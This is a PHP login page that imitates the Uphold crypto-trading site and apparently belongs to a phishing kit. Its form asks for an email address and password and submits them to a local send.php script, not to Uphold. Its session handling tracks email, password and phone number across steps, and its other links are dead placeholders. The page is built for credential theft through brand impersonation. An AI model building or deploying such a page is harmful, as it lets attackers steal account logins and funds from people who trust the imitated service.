<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    unset($_SESSION['email']);
    unset($_SESSION['password']);
    unset($_SESSION['phone_number']);
    $title = 'Uphold: Buy &amp; Sell Crypto &amp; Metals | Trade Digital Assets';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row">
                <?php include_once './includes/sidebar.php'; ?>
                <div class="col-md-6 order-md-2 order-1">
                    <div class="row">
                        <div class="col-8 bg-white mt60 rounded-3">
                            <div class="d-flex align-items-center ">
                                <form method="post" action="<?= base_url('send.php') ?>" class="col-12 p25 form" style="position:relative;min-height:550px">
                                    <h4 class="fs22 fw-bold mb20">Log in to Uphold</h4>
                                    <div class="fs12 my10" style="letter-spacing:0.4">
                                        Not a member? <a class="text-decoration-none text-primary-2" href="#">Sign up now</a>
                                    </div>
                                    <div class="my35 inputField">
                                        <label class="form-label">Email address</label>
                                        <input name="email" type="email" required="" class="form-control" value="" >
                                    </div>
                                    <div class="my35 inputField">
                                        <label class="form-label">Password</label>
                                         <input name="password" type="password" required="" minlength="3" maxlength="50" class="form-control" value="" >
                                    </div>
                                    <div class="mt15 mb60">
                                        <a href="#" class="text-primary-2 text-decoration-none fw-medium fs13">Forgot password?</a>
                                    </div>
                                    <div class="text-center mx-auto d-grid gap-2" style="position: absolute; bottom: 20; width: 85%">
                                        <button type="submit" class="btn btn-success bg-primary-2 border-0 rounded-pill btn-lg btn-block rounded-0 fs14 py10">Next</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>